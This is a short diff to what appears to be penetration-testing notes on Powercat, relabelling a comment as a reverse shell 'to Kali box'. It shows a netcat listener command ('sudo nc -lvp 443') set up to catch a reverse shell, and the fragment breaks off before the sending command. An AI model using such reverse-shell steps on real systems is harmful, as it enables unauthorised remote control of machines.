@@ -7,7 +7,7 @@ PS C:\> powercat -h
 ```
 
 ```powershell
-# Powercat reverse shell
+# Powercat reverse shell to Kali box
 $ sudo nc -lvp 443
 
 # Send a reverse shell via Powercat 
